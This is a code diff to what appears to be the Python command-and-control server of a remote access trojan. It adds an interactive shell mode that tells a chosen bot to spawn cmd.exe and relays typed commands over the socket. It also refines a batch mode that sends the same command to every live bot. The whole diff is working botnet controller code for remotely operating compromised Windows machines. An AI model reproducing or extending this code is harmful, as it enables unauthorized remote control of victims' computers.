@@ -92,10 +92,64 @@ class Handler(threading.Thread):
     def getPort(self):
         return self.port
 
+    def shell(self):
+
+        
+        # if command is 'shell':
+        #   we send the shell keyword, which initiates the cmd.exe, and then redirects all stdin/out to the socket
+        #   the shell will still be receiving any information we send it, therefore thats why it closed only the cmd.exe session when we subsequently exited.
+        #   We need to figure out a way to capture the shell keyword here, then send it over, while also realizing in the c2
+        #   that we are going to be sending and receiving directly to and from the cmd.exe process, effectively needing a function, loop, or just to catch and exit twice[?]
+        #     
+
+
+        # Initiate shell 
+        try:
+            self.client.send(("shell").encode('utf-8'))
+        except Exception as ex:
+            print(f"[* BotHandler-Msg:ShellExec] Unable to initiate shell with bot {self.bot_id} at {str(self.ip)}")
+            print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
+            return False
+        else:
+            recvVal = (self.client.recv(2048)).decode('utf-8')      # Receive reply from RAT
+            print(recvVal)
+            recvVal = (self.client.recv(2048)).decode('utf-8')      # Receive reply from RAT
+            print(recvVal)
+    
+        while (True):
+            try:
+                cmd = str(input())
+            except Exception as ex:
+                print(f"[* BotHandler-Msg:ShellExec] Unable to parse command")
+                print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
+            else:
+                try:
+                    # if(cmd.casefold() == 'quit' or cmd.casefold() == 'exit'):
+                    #     self.client.send("exit".encode('utf-8'))
+                    #     break
+                    # else:
+                    self.client.send(cmd.encode('utf-8'))
+                    print(f"--data being sent = {cmd}")
+                except Exception as ex:
+                    print(f"[* BotHandler-Msg:ShellExec] Unable to send command to bot {self.bot_id} at {str(self.ip)}")
+                    print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
+                else:
+                    print("--reached receive--")
+                    recvVal = (self.client.recv(4096)).decode('utf-8')      # Receive reply from RAT
+                    print("--printing recv--")
+                    print(recvVal)
+                    
+            print("==exiting loop iteration==")
+
+        print(f"[* BotHandler-Msg:ShellExec] Exiting interaction with Bot #{self.bot_id} at {str(self.ip)}")
+        return True
+
+
     def execute(self, command):
 
         print(f"[* BotHandler-Msg] Received Command: {str(command)} for bot {str(self.bot_id)}")
 
+        # Single instance execution
         try:
             #command += "\n"
 
@@ -111,7 +165,7 @@ class Handler(threading.Thread):
             print(f"[* BotHandler-Msg] Error: {ex}")
             return "== Return Value Error =="
         else:
-            recvVal = (self.client.recv(1024)).decode('utf-8')      # Receive reply from RAT
+            recvVal = (self.client.recv(2048)).decode('utf-8')      # Receive reply from RAT
             return recvVal
 
             # TODO %%
@@ -167,20 +221,12 @@ class Interpreter(threading.Thread):
                 self.listAlive()
             elif (cmd == "list-dead"):
                 self.listDead()
-            # elif (cmd == "list-all"):
-            #     self.listAll()
-            # elif (cmd == "activate"):
-            #     self.activate()
-            # elif (cmd == "deactivate"):
-            #     self.deactivate()
             elif (cmd == "batch-mode"):
                 self.batchMode()
             elif (cmd.startswith("interact")):
-                print("tbc")
-            elif (cmd.startswith("interact")):
                 try:
                     print(cmd)
-                    arg_id = cmd.split()[1]
+                    arg_id = int(cmd.split()[1])
                     print(arg_id)
                 except Exception as ex:
                     print(f"[* Interpreter-Msg] Unable to process Bot ID entered...")
@@ -204,10 +250,10 @@ class Interpreter(threading.Thread):
  
         self.clearScreen()
 
-        print("[* Interpreter-Msg] Entering Batch-Mode execution.")
+        print("[* Interpreter-Msg] Entering Batch-Mode execution.\n")
         print 
         print("[* Interpreter-Msg] Systems in use under this mode will each receive the same command each time you enter.")
-        print("[* Interpreter-Msg] Enter QUIT into the terminal to exit batch-mode ")
+        print("[* Interpreter-Msg] Enter QUIT into the terminal to exit batch-mode \n\n")
         print
         print
 
@@ -255,6 +301,10 @@ class Interpreter(threading.Thread):
                 elif (batch_cmd.casefold() == "exit"):
                     batchList.clear()
                     self.exit()
+                elif (batch_cmd.casefold() == "shell"):
+                    print("[* Interpreter-Msg] Can't interact with individual shells in this environment")
+                    print("[* Interpreter-Msg] Please exit if that is the desired result\n")
+                    continue
                 else:
                     try:
                         print(f"[+] Sending Command: {batch_cmd} to {str(len(aliveConnections))} bots")
@@ -345,8 +395,19 @@ class Interpreter(threading.Thread):
         os.system("clear")
 #------------------------------------------------------------------------------------------------------------------------------
     def interact(self, id):
-        print("Shell function entry point")
-        
+        # print("Shell function entry point")
+        print(f"[* Interpreter-Msg] Entering individual interaction with Bot #{id}.\n")
+        print("[* Interpreter-Msg] Be mindful that this mode is quite loud.")
+        print("[* Interpreter-Msg] A CMD.EXE process has been spawned...\n\n")
+
+        for conn in aliveConnections:
+            if conn.getID() == id:
+                shellExecStatus = conn.shell()
+
+        if shellExecStatus:
+            print("[* Interpreter-Msg] Shell exited graefully...\n")
+        else:
+            print("[* Interpreter-Msg] Shell exited with errors...\n")
 
 
 #=================================================================================================================================
